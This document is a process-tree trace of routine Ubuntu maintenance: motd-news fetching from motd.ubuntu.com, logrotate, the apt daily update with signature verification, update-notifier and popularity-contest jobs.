+  └─ ls (PID 307671): "ls -l /proc/1/fd/0 /proc/1/fd/1 /proc/1/fd/10 /proc/1/fd/11 /proc/1/fd/12 /proc/1/fd/13 /proc/1/fd/14 /proc/1/fd/15 /proc/1/fd/16 /proc/1/fd/17 /proc/1/fd/18 /proc/1/fd/19 /proc/1/fd/2 /proc/1/fd/20 /proc/1/fd/21 /proc/1/fd/22 /proc/1/fd/23 /proc/1/fd/24 /proc/1/fd/25 /proc/1/fd/26 /proc/1/fd/27 /proc/1/fd/28 /proc/1/fd/3 /proc/1/fd/31 /proc/1/fd/32 /proc/1/fd/34 /proc/1/fd/35 /proc/1/fd/36 /proc/1/fd/37 /proc/1/fd/38 /proc/1/fd/39 /proc/1/fd/4 /proc/1/fd/40 /proc/1/fd/41 /proc/1/fd/42 /proc/1/fd/43 /proc/1/fd/44 /proc/1/fd/45 /proc/1/fd/46 /proc/1/fd/47 /proc/1/fd/48 /proc/1/fd/5 /proc/1/fd/5...[truncated, 4095 chars total]"  [x4]
+  └─ ls (PID 308488): "ls -l /proc/1/fd/0 /proc/1/fd/1 /proc/1/fd/10 /proc/1/fd/11 /proc/1/fd/12 /proc/1/fd/13 /proc/1/fd/14 /proc/1/fd/15 /proc/1/fd/16 /proc/1/fd/17 /proc/1/fd/18 /proc/1/fd/19 /proc/1/fd/2 /proc/1/fd/20 /proc/1/fd/21 /proc/1/fd/22 /proc/1/fd/23 /proc/1/fd/24 /proc/1/fd/25 /proc/1/fd/26 /proc/1/fd/27 /proc/1/fd/28 /proc/1/fd/3 /proc/1/fd/31 /proc/1/fd/32 /proc/1/fd/34 /proc/1/fd/35 /proc/1/fd/36 /proc/1/fd/37 /proc/1/fd/38 /proc/1/fd/39 /proc/1/fd/4 /proc/1/fd/40 /proc/1/fd/41 /proc/1/fd/42 /proc/1/fd/43 /proc/1/fd/44 /proc/1/fd/45 /proc/1/fd/46 /proc/1/fd/47 /proc/1/fd/48 /proc/1/fd/5 /proc/1/fd/5...[truncated, 4095 chars total]"
+  └─ ls (PID 308541): "ls -l /proc/1/fd/0 /proc/1/fd/1 /proc/1/fd/10 /proc/1/fd/11 /proc/1/fd/12 /proc/1/fd/13 /proc/1/fd/14 /proc/1/fd/15 /proc/1/fd/16 /proc/1/fd/17 /proc/1/fd/18 /proc/1/fd/19 /proc/1/fd/2 /proc/1/fd/20 /proc/1/fd/21 /proc/1/fd/22 /proc/1/fd/23 /proc/1/fd/24 /proc/1/fd/25 /proc/1/fd/26 /proc/1/fd/27 /proc/1/fd/28 /proc/1/fd/3 /proc/1/fd/31 /proc/1/fd/32 /proc/1/fd/34 /proc/1/fd/35 /proc/1/fd/36 /proc/1/fd/37 /proc/1/fd/38 /proc/1/fd/39 /proc/1/fd/4 /proc/1/fd/40 /proc/1/fd/41 /proc/1/fd/42 /proc/1/fd/43 /proc/1/fd/44 /proc/1/fd/45 /proc/1/fd/46 /proc/1/fd/47 /proc/1/fd/48 /proc/1/fd/5 /proc/1/fd/5...[truncated, 4095 chars total]"  [x11]
+sh (PID 307457): "sh -c "/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh" 307370 307447 307448"  [x2]
+  └─ cpuUsage.sh (PID 307458): "cpuUsage.sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh 307370 307447 307448"  [x2]
+50-motd-news (PID 307920): "50-motd-news /etc/update-motd.d/50-motd-news --force"
+  └─ mktemp (PID 307921): "mktemp"  [x3]
+  └─ awk (PID 307938): "awk $1 == "ii" { print($3); exit(0); }"
+  └─ dpkg (PID 307937): "dpkg -l wget"  [x4]
+  └─ dpkg-query (PID 307937): "dpkg-query --list -- wget"
+  └─ sed (PID 307941): "sed -e s/ /\//g"
+  └─ sed (PID 307948): "sed -e s/.*: // -e s:\s\+:/:g"
+  └─ grep (PID 307947): "grep -m1 ^model name /proc/cpuinfo"
+  └─ wget (PID 307949): "wget --timeout 60 -U wget/1.20.3-1ubuntu1 Ubuntu/20.04.2/LTS GNU/Linux/5.4.0-66-generic/x86_64 Intel(R)/Xeon(R)/Gold/6266C/CPU/@/3.00GHz cloud_id/unknown -O- --content-on-error https://motd.ubuntu.com"
+        wrote → /tmp/tmp.cuMJvZooML
+        wrote → /tmp/tmp.E4eqW88PCB
+  └─ cat (PID 307950): "cat /tmp/tmp.E4eqW88PCB"  [x2]
+  └─ rm (PID 307958): "rm -f /tmp/tmp.E4eqW88PCB /tmp/tmp.cuMJvZooML /tmp/tmp.kXHNut2kx5"
+install (PID 308073): "install -d -o man -g man -m 0755 /var/cache/man"
+find (PID 308086): "find /var/cache/man -type f -name *.gz -atime +6 -delete"
+logrotate (PID 308071): "logrotate /etc/logrotate.conf"
+  └─ gzip (PID 308088): "gzip"
+  └─ sh (PID 308089): "sh -c 
+		/usr/lib/rsyslog/rsyslog-rotate
+ logrotate_script /var/log/syslog"
+    └─ rsyslog-rotate (PID 308090): "rsyslog-rotate /usr/lib/rsyslog/rsyslog-rotate"
+      └─ systemctl (PID 308091): "systemctl kill -s HUP rsyslog.service"
+mandb (PID 308087): "mandb --quiet"
+fwupdmgr (PID 308191): "fwupdmgr refresh --no-metadata-check"
+fwupd (PID 308205): "fwupd"
+apt-helper (PID 308674): "apt-helper wait-online"  [x13]
+  └─ systemctl (PID 308675): "systemctl is-active -q systemd-networkd.service"
+  └─ systemctl (PID 308690): "systemctl is-active -q NetworkManager.service"
+  └─ nm-online (PID 308691): "nm-online -q --timeout 30"
+  └─ systemctl (PID 308695): "systemctl is-active -q connman.service"
+apt.systemd.dai (PID 308696): "apt.systemd.dai /usr/lib/apt/apt.systemd.daily update"
+  └─ apt-config (PID 308697): "apt-config shell StateDir Dir::State/d"
+  └─ flock (PID 308699): "flock -w 3600 3"
+  └─ apt.systemd.dai (PID 308700): "apt.systemd.dai /usr/lib/apt/apt.systemd.daily lock_is_held update"
+    └─ cmp (PID 308701): "cmp -s apt.extended_states.0 /var/lib/apt/extended_states"
+    └─ which (PID 308702): "which /usr/bin/which apt-config"
+    └─ apt-config (PID 308703): "apt-config shell AutoAptEnable APT::Periodic::Enable"
+    └─ apt-config (PID 308705): "apt-config shell VERBOSE APT::Periodic::Verbose"
+    └─ which (PID 308707): "which /usr/bin/which apt-get"
+    └─ apt-get (PID 308708): "apt-get check -qq"
+          wrote → /tmp/clearsigned.message.Md7DDh
+          wrote → /tmp/clearsigned.message.49cc0g
+          wrote → /tmp/clearsigned.message.OFp6lf
+          wrote → /tmp/clearsigned.message.gZTgPe
+          wrote → /tmp/clearsigned.message.usXqrg
+          wrote → /tmp/clearsigned.message.q6M6sh
+          wrote → /tmp/clearsigned.message.QElnLh
+          wrote → /tmp/clearsigned.message.pQseMd
+          wrote → /tmp/clearsigned.message.RoYH0f
+          wrote → /tmp/clearsigned.message.NDSvif
+          wrote → /tmp/clearsigned.message.snjwYh
+          wrote → /tmp/clearsigned.message.H2PHYf
+          wrote → /tmp/clearsigned.message.LKtYue
+          wrote → /tmp/clearsigned.message.OCUELd
+          wrote → /tmp/clearsigned.message.Wbanrg
+          wrote → /tmp/clearsigned.message.0NlzAg
+          wrote → /tmp/clearsigned.message.AkEgSh
+    └─ apt-config (PID 308712): "apt-config shell UpdateInterval APT::Periodic::Update-Package-Lists"
+    └─ apt-config (PID 308714): "apt-config shell DownloadUpgradeableInterval APT::Periodic::Download-Upgradeable-Packages"
+    └─ apt-config (PID 308716): "apt-config shell UnattendedUpgradeInterval APT::Periodic::Unattended-Upgrade"
+    └─ apt-config (PID 308718): "apt-config shell AutocleanInterval APT::Periodic::AutocleanInterval"
+    └─ apt-config (PID 308720): "apt-config shell CleanInterval APT::Periodic::CleanInterval"
+    └─ apt-config (PID 308722): "apt-config shell BackupArchiveInterval APT::Periodic::BackupArchiveInterval"
+    └─ apt-config (PID 308724): "apt-config shell Debdelta APT::Periodic::Download-Upgradeable-Packages-Debdelta"
+    └─ date (PID 308727): "date -r /var/lib/apt/periodic/update-stamp --iso-8601"
+    └─ date (PID 308726): "date --date=2022-03-28 +%s"
+    └─ date (PID 308729): "date --iso-8601"
+    └─ date (PID 308728): "date --date=2022-03-29 +%s"
+    └─ apt-get (PID 308730): "apt-get -qq -y update"
+          wrote → /tmp/clearsigned.message.lctRCU
+          wrote → /tmp/clearsigned.message.lqG9WT
+          wrote → /tmp/clearsigned.message.lsbkgT
+          wrote → /tmp/clearsigned.message.Ox5m3U
+          wrote → /tmp/clearsigned.message.AQrjUU
+          wrote → /tmp/clearsigned.message.vnFOwU
+          wrote → /tmp/clearsigned.message.EnGLPV
+          wrote → /tmp/clearsigned.message.eYRkBW
+          wrote → /tmp/clearsigned.message.PnkDXU
+          wrote → /tmp/clearsigned.message.39XsKT
+          wrote → /tmp/clearsigned.message.JY73JS
+          wrote → /tmp/clearsigned.message.c54jBS
+          wrote → /tmp/clearsigned.message.N7DE0T
+          wrote → /tmp/clearsigned.message.M2CRxS
+          wrote → /tmp/clearsigned.message.BYMegV
+          wrote → /tmp/clearsigned.message.0nP4sW
+          wrote → /tmp/clearsigned.message.UwOfuW
+          wrote → /tmp/clearsigned.message.97IHuT
+          wrote → /tmp/clearsigned.message.nIE1nW
+          wrote → /tmp/clearsigned.message.nEamaW
+          wrote → /tmp/clearsigned.message.K2zcSV
+          wrote → /tmp/clearsigned.message.XOcl8S
+          wrote → /tmp/clearsigned.message.vgwqUU
+          wrote → /tmp/clearsigned.message.ls6wjT
+          wrote → /tmp/clearsigned.message.pdQUaW
+          wrote → /tmp/clearsigned.message.DzPWaT
+          wrote → /tmp/clearsigned.message.KLJZ0V
+          wrote → /tmp/clearsigned.message.joZaOW
+          wrote → /tmp/clearsigned.message.9cYYwV
+          wrote → /tmp/clearsigned.message.Y5ZOTU
+      └─ http (PID 308732): "http"  [x2]
+      └─ https (PID 308733): "https"  [x2]
+            connected to → 13.33.21.37:443
+      └─ gpgv (PID 308736): "gpgv"  [x2]
+            wrote → /tmp/apt.conf.ReEHey
+            wrote → /tmp/apt.data.aQzZGv
+            wrote → /tmp/apt.sig.LRiljy
+            wrote → /tmp/apt.conf.4Av5IW
+            wrote → /tmp/apt.data.mOCLZY
+            wrote → /tmp/apt.sig.y3GXyZ
+            wrote → /tmp/apt.conf.gdhvyt
+            wrote → /tmp/apt.data.SUgCHt
+            wrote → /tmp/apt.sig.AYpKIt
+            wrote → /tmp/apt.conf.qzdiW3
+            wrote → /tmp/apt.data.hzBqU4
+            wrote → /tmp/apt.sig.dWuIM2
+            wrote → /tmp/apt.conf.PVbU8u
+            wrote → /tmp/apt.data.Q4cQau
+            wrote → /tmp/apt.sig.lwS7Dw
+        └─ apt-key (PID 308739): "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.LRiljy /tmp/apt.data.aQzZGv"
+              wrote → /tmp/apt-key-gpghome.PZvGPQvgZm/gpg.1.sh
+          └─ apt-config (PID 308741): "apt-config shell MASTER_KEYRING APT::Key::MasterKeyring"  [x5]
+          └─ apt-config (PID 308743): "apt-config shell ARCHIVE_KEYRING APT::Key::ArchiveKeyring"  [x5]
+          └─ apt-config (PID 308745): "apt-config shell REMOVED_KEYS APT::Key::RemovedKeys"  [x5]
+          └─ apt-config (PID 308747): "apt-config shell ARCHIVE_KEYRING_URI APT::Key::ArchiveKeyringURI"  [x5]
+          └─ apt-config (PID 308750): "apt-config shell TRUSTEDFILE Apt::GPGV::TrustedKeyring"  [x5]
+          └─ apt-config (PID 308752): "apt-config shell TRUSTEDFILE Dir::Etc::Trusted/f"  [x5]
+          └─ apt-config (PID 308754): "apt-config shell GPGV Apt::Key::gpgvcommand"  [x5]
+          └─ mktemp (PID 308756): "mktemp --directory --tmpdir apt-key-gpghome.XXXXXXXXXX"  [x5]
+          └─ chmod (PID 308757): "chmod 700 /tmp/apt-key-gpghome.PZvGPQvgZm"
+          └─ readlink (PID 308758): "readlink -f /tmp/apt-key-gpghome.PZvGPQvgZm"
+          └─ rm (PID 308759): "rm -f /tmp/apt-key-gpghome.PZvGPQvgZm/pubring.gpg"
+          └─ touch (PID 308760): "touch /tmp/apt-key-gpghome.PZvGPQvgZm/pubring.gpg"
+          └─ cmp (PID 308762): "cmp --silent --bytes=1 - /etc/apt/trusted.gpg"  [x5]
+          └─ cat (PID 308764): "cat /etc/apt/trusted.gpg"  [x5]
+                wrote → /tmp/apt-key-gpghome.PZvGPQvgZm/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.KFLYSZbcZ0/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.rdnPnYUhQw/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.eyujuNlmBP/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.NSxjOseUPX/pubring.gpg
+          └─ apt-config (PID 308765): "apt-config shell TRUSTEDPARTS Dir::Etc::TrustedParts/d"  [x5]
+          └─ readlink (PID 308767): "readlink -f /etc/apt/trusted.gpg.d/"  [x5]
+          └─ find (PID 308768): "find /etc/apt/trusted.gpg.d -mindepth 1 -maxdepth 1 ( -name *.gpg -o -name *.asc )"  [x5]
+          └─ sort (PID 308771): "sort"  [x5]
+          └─ cmp (PID 308773): "cmp --silent --bytes=1 - /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg"  [x10]
+          └─ cat (PID 308775): "cat /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg"  [x10]
+                wrote → /tmp/apt-key-gpghome.PZvGPQvgZm/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.KFLYSZbcZ0/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.rdnPnYUhQw/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.eyujuNlmBP/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.NSxjOseUPX/pubring.gpg
+          └─ cmp (PID 308777): "cmp --silent --bytes=1 - /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg"  [x5]
+          └─ cat (PID 308779): "cat /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg"  [x5]
+                wrote → /tmp/apt-key-gpghome.PZvGPQvgZm/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.KFLYSZbcZ0/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.rdnPnYUhQw/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.eyujuNlmBP/pubring.gpg
+                wrote → /tmp/apt-key-gpghome.NSxjOseUPX/pubring.gpg
+          └─ cp (PID 308784): "cp -a /tmp/apt-key-gpghome.PZvGPQvgZm/pubring.gpg /tmp/apt-key-gpghome.PZvGPQvgZm/pubring.orig.gpg"
+                wrote → /tmp/apt-key-gpghome.PZvGPQvgZm/pubring.orig.gpg
+          └─ sed (PID 308787): "sed -e s#'#'"'"'#g"  [x10]
+          └─ gpgv (PID 308791): "gpgv --homedir /tmp/apt-key-gpghome.PZvGPQvgZm --keyring /tmp/apt-key-gpghome.PZvGPQvgZm/pubring.gpg --ignore-time-conflict --status-fd 3 /tmp/apt.sig.LRiljy /tmp/apt.data.aQzZGv"
+          └─ gpgconf (PID 308792): "gpgconf --kill all"  [x5]
+            └─ gpg-connect-age (PID 308793): "gpg-connect-age --no-autostart --dirmngr KILLDIRMNGR"  [x5]
+            └─ gpg-connect-age (PID 308794): "gpg-connect-age -s --no-autostart GETINFO scd_running /if ${! $?} scd killscd /end"  [x5]
+            └─ gpg-connect-age (PID 308795): "gpg-connect-age --no-autostart KILLAGENT"  [x5]
+          └─ rm (PID 308796): "rm -rf /tmp/apt-key-gpghome.PZvGPQvgZm"
+        └─ apt-key (PID 308798): "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.y3GXyZ /tmp/apt.data.mOCLZY"
+              wrote → /tmp/apt-key-gpghome.KFLYSZbcZ0/gpg.1.sh
+          └─ chmod (PID 308816): "chmod 700 /tmp/apt-key-gpghome.KFLYSZbcZ0"
+          └─ readlink (PID 308817): "readlink -f /tmp/apt-key-gpghome.KFLYSZbcZ0"
+          └─ rm (PID 308818): "rm -f /tmp/apt-key-gpghome.KFLYSZbcZ0/pubring.gpg"
+          └─ touch (PID 308819): "touch /tmp/apt-key-gpghome.KFLYSZbcZ0/pubring.gpg"
+          └─ cp (PID 308843): "cp -a /tmp/apt-key-gpghome.KFLYSZbcZ0/pubring.gpg /tmp/apt-key-gpghome.KFLYSZbcZ0/pubring.orig.gpg"
+                wrote → /tmp/apt-key-gpghome.KFLYSZbcZ0/pubring.orig.gpg
+          └─ gpgv (PID 308850): "gpgv --homedir /tmp/apt-key-gpghome.KFLYSZbcZ0 --keyring /tmp/apt-key-gpghome.KFLYSZbcZ0/pubring.gpg --ignore-time-conflict --status-fd 3 /tmp/apt.sig.y3GXyZ /tmp/apt.data.mOCLZY"
+          └─ rm (PID 308855): "rm -rf /tmp/apt-key-gpghome.KFLYSZbcZ0"
+        └─ apt-key (PID 308857): "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.AYpKIt /tmp/apt.data.SUgCHt"
+              wrote → /tmp/apt-key-gpghome.rdnPnYUhQw/gpg.1.sh
+          └─ chmod (PID 308877): "chmod 700 /tmp/apt-key-gpghome.rdnPnYUhQw"
+          └─ readlink (PID 308878): "readlink -f /tmp/apt-key-gpghome.rdnPnYUhQw"
+          └─ rm (PID 308879): "rm -f /tmp/apt-key-gpghome.rdnPnYUhQw/pubring.gpg"
+          └─ touch (PID 308880): "touch /tmp/apt-key-gpghome.rdnPnYUhQw/pubring.gpg"
+          └─ cp (PID 308904): "cp -a /tmp/apt-key-gpghome.rdnPnYUhQw/pubring.gpg /tmp/apt-key-gpghome.rdnPnYUhQw/pubring.orig.gpg"
+                wrote → /tmp/apt-key-gpghome.rdnPnYUhQw/pubring.orig.gpg
+          └─ gpgv (PID 308911): "gpgv --homedir /tmp/apt-key-gpghome.rdnPnYUhQw --keyring /tmp/apt-key-gpghome.rdnPnYUhQw/pubring.gpg --ignore-time-conflict --status-fd 3 /tmp/apt.sig.AYpKIt /tmp/apt.data.SUgCHt"
+          └─ rm (PID 308916): "rm -rf /tmp/apt-key-gpghome.rdnPnYUhQw"
+        └─ apt-key (PID 308918): "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.dWuIM2 /tmp/apt.data.hzBqU4"
+              wrote → /tmp/apt-key-gpghome.eyujuNlmBP/gpg.1.sh
+          └─ chmod (PID 308936): "chmod 700 /tmp/apt-key-gpghome.eyujuNlmBP"
+          └─ readlink (PID 308937): "readlink -f /tmp/apt-key-gpghome.eyujuNlmBP"
+          └─ rm (PID 308938): "rm -f /tmp/apt-key-gpghome.eyujuNlmBP/pubring.gpg"
+          └─ touch (PID 308939): "touch /tmp/apt-key-gpghome.eyujuNlmBP/pubring.gpg"
+          └─ cp (PID 308963): "cp -a /tmp/apt-key-gpghome.eyujuNlmBP/pubring.gpg /tmp/apt-key-gpghome.eyujuNlmBP/pubring.orig.gpg"
+                wrote → /tmp/apt-key-gpghome.eyujuNlmBP/pubring.orig.gpg
+          └─ gpgv (PID 308970): "gpgv --homedir /tmp/apt-key-gpghome.eyujuNlmBP --keyring /tmp/apt-key-gpghome.eyujuNlmBP/pubring.gpg --ignore-time-conflict --status-fd 3 /tmp/apt.sig.dWuIM2 /tmp/apt.data.hzBqU4"
+          └─ rm (PID 308975): "rm -rf /tmp/apt-key-gpghome.eyujuNlmBP"
+        └─ apt-key (PID 308977): "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.lwS7Dw /tmp/apt.data.Q4cQau"
+              wrote → /tmp/apt-key-gpghome.NSxjOseUPX/gpg.1.sh
+          └─ chmod (PID 308995): "chmod 700 /tmp/apt-key-gpghome.NSxjOseUPX"
+          └─ readlink (PID 308996): "readlink -f /tmp/apt-key-gpghome.NSxjOseUPX"
+          └─ rm (PID 308997): "rm -f /tmp/apt-key-gpghome.NSxjOseUPX/pubring.gpg"
+          └─ touch (PID 308998): "touch /tmp/apt-key-gpghome.NSxjOseUPX/pubring.gpg"
+          └─ cp (PID 309022): "cp -a /tmp/apt-key-gpghome.NSxjOseUPX/pubring.gpg /tmp/apt-key-gpghome.NSxjOseUPX/pubring.orig.gpg"
+                wrote → /tmp/apt-key-gpghome.NSxjOseUPX/pubring.orig.gpg
+          └─ gpgv (PID 309029): "gpgv --homedir /tmp/apt-key-gpghome.NSxjOseUPX --keyring /tmp/apt-key-gpghome.NSxjOseUPX/pubring.gpg --ignore-time-conflict --status-fd 3 /tmp/apt.sig.lwS7Dw /tmp/apt.data.Q4cQau"
+          └─ rm (PID 309034): "rm -rf /tmp/apt-key-gpghome.NSxjOseUPX"
+      └─ store (PID 308864): "store"  [x2]
+      └─ sh (PID 309036): "sh -c touch /var/lib/apt/periodic/update-success-stamp 2>/dev/null || true"
+        └─ touch (PID 309037): "touch /var/lib/apt/periodic/update-success-stamp"
+      └─ sh (PID 309038): "sh -c /usr/bin/test -e /usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service && /usr/bin/test -S /var/run/dbus/system_bus_socket && /usr/bin/gdbus call --system --dest org.freedesktop.PackageKit --object-path /org/freedesktop/PackageKit --timeout 4 --method org.freedesktop.PackageKit.StateHasChanged cache-update > /dev/null; /bin/echo > /dev/null"
+        └─ test (PID 309039): "test -e /usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service"
+        └─ test (PID 309040): "test -S /var/run/dbus/system_bus_socket"
+        └─ gdbus (PID 309041): "gdbus call --system --dest org.freedesktop.PackageKit --object-path /org/freedesktop/PackageKit --timeout 4 --method org.freedesktop.PackageKit.StateHasChanged cache-update"
+        └─ echo (PID 309049): "echo"
+      └─ sh (PID 309050): "sh -c if /usr/bin/test -w /var/lib/command-not-found/ -a -e /usr/lib/cnf-update-db; then /usr/lib/cnf-update-db > /dev/null; fi"
+        └─ test (PID 309051): "test -w /var/lib/command-not-found/ -a -e /usr/lib/cnf-update-db"
+        └─ cnf-update-db (PID 309052): "cnf-update-db /usr/lib/cnf-update-db"
+      └─ sh (PID 309054): "sh -c /usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true"
+        └─ update-motd-upd (PID 309055): "update-motd-upd -e /usr/lib/update-notifier/update-motd-updates-available"
+          └─ find (PID 309066): "find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/updates-available -print -quit"
+          └─ dirname (PID 309068): "dirname /var/lib/update-notifier/updates-available"
+          └─ apt-check (PID 309069): "apt-check /usr/lib/update-notifier/apt-check --human-readable"  [x304]
+                wrote → /tmp/clearsigned.message.ohlrIx
+                wrote → /tmp/clearsigned.message.9PI6Lx
+                wrote → /tmp/clearsigned.message.3itcWw
+                wrote → /tmp/clearsigned.message.FU1thz
+                wrote → /tmp/clearsigned.message.o4tSjx
+                wrote → /tmp/clearsigned.message.bm0CTv
+                wrote → /tmp/clearsigned.message.prsglx
+                wrote → /tmp/clearsigned.message.aX83bw
+                wrote → /tmp/clearsigned.message.4Hq8Qy
+                wrote → /tmp/clearsigned.message.BiubQw
+                wrote → /tmp/clearsigned.message.fJqPKx
+                wrote → /tmp/clearsigned.message.kV5u5z
+                wrote → /tmp/clearsigned.message.SS2Qny
+                wrote → /tmp/clearsigned.message.BalCDy
+                wrote → /tmp/clearsigned.message.AHsReA
+                wrote → /tmp/clearsigned.message.BXENty
+                wrote → /tmp/clearsigned.message.qsO8Xv
+                wrote → /tmp/clearsigned.message.iCbAAy
+                wrote → /tmp/clearsigned.message.F45VBw
+                wrote → /tmp/clearsigned.message.IESVsy
+                wrote → /tmp/clearsigned.message.LDhIlz
+                wrote → /tmp/clearsigned.message.LkNU6x
+                wrote → /tmp/clearsigned.message.Msu2Dy
+                wrote → /tmp/clearsigned.message.VFay5y
+                wrote → /tmp/clearsigned.message.CMeNXv
+                wrote → /tmp/clearsigned.message.i4Xi6w
+                wrote → /tmp/clearsigned.message.p3Hiaw
+                wrote → /tmp/clearsigned.message.II4Mjw
+                wrote → /tmp/clearsigned.message.UGW5Nv
+                wrote → /tmp/clearsigned.message.auppaA
+                wrote → /tmp/clearsigned.message.JPN2xz
+                wrote → /tmp/clearsigned.message.oqBMGy
+                wrote → /tmp/clearsigned.message.MEeD6v
+                wrote → /tmp/clearsigned.message.R6MRWy
+                wrote → /tmp/clearsigned.message.fDn03w
+                wrote → /tmp/clearsigned.message.cm1e1v
+                wrote → /tmp/clearsigned.message.cLsO7z
+                wrote → /tmp/clearsigned.message.WDAB3x
+                wrote → /tmp/clearsigned.message.xfgsDx
+                wrote → /tmp/clearsigned.message.YTTmcA
+                wrote → /tmp/clearsigned.message.qS37Gz
+                wrote → /tmp/clearsigned.message.X1YEkz
+                wrote → /tmp/clearsigned.message.KsCley
+                wrote → /tmp/clearsigned.message.Bca4ry
+                wrote → /tmp/clearsigned.message.oYZOVy
+                wrote → /tmp/clearsigned.message.4qTc1z
+                wrote → /tmp/clearsigned.message.vnIXBw
+                wrote → /tmp/clearsigned.message.BKCKMz
+                wrote → /tmp/clearsigned.message.MJUm6v
+                wrote → /tmp/clearsigned.message.z7Tgdw
+                wrote → /tmp/clearsigned.message.q9Pjjw
+                wrote → /tmp/clearsigned.message.aPZGpy
+                wrote → /tmp/clearsigned.message.F2PGvw
+                wrote → /tmp/clearsigned.message.RMkkNz
+                wrote → /tmp/clearsigned.message.83Zcby
+                wrote → /tmp/clearsigned.message.3TAvjw
+            └─ lsb_release (PID 309070): "lsb_release -Es /usr/bin/lsb_release -c -s"  [x102]
+          └─ mv (PID 309177): "mv /var/lib/update-notifier/tmp.qvwheXIVhx /var/lib/update-notifier/updates-available"
+          └─ chmod (PID 309178): "chmod +r /var/lib/update-notifier/updates-available"
+          └─ rm (PID 309179): "rm -f /var/lib/update-notifier/tmp.qvwheXIVhx"
+    └─ touch (PID 309182): "touch /var/lib/apt/periodic/update-stamp"
+    └─ which (PID 309183): "which /usr/bin/which unattended-upgrade"
+    └─ env (PID 309184): "env LC_ALL=C.UTF-8 unattended-upgrade --help"  [x4]
+    └─ grep (PID 309185): "grep -q download-only"
+    └─ unattended-upgr (PID 309184): "unattended-upgr /usr/bin/unattended-upgrade --help"  [x10]
+      └─ lsb_release (PID 309187): "lsb_release -Es /usr/bin/lsb_release -d -s"
+      └─ lsb_release (PID 309188): "lsb_release -Es /usr/bin/lsb_release -i -s"
+packagekitd (PID 309044): "packagekitd"
+nm-dispatcher (PID 309225): "nm-dispatcher"
+  └─ 01-ifupdown (PID 309239): "01-ifupdown -e /etc/NetworkManager/dispatcher.d/01-ifupdown eth0 dhcp4-change"
+  └─ 20-chrony (PID 309240): "20-chrony /etc/NetworkManager/dispatcher.d/20-chrony eth0 dhcp4-change"
+sh (PID 309275): "sh -c    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond"
+  └─ popularity-cont (PID 309276): "popularity-cont /etc/cron.daily/popularity-contest --crond"
